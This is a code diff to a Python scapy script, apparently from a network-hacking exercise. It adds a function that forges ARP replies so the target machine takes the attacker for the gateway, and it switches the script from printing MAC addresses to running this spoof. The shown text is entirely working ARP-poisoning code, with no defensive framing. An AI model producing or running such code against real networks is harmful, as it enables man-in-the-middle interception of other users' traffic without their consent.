@@ -20,8 +20,14 @@ def get_mac(ip):
     mac = response[0][1].hwsrc
     return mac
 
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
+    scapy.send(packet, timeout =1, verbose = False)
+
 
 options = get_arguments()
-print(get_mac(options.target))
-print(get_mac(options.gateway))
+#print(get_mac(options.target))
+#print(get_mac(options.gateway))
+spoof(options.target, options.gateway)
 
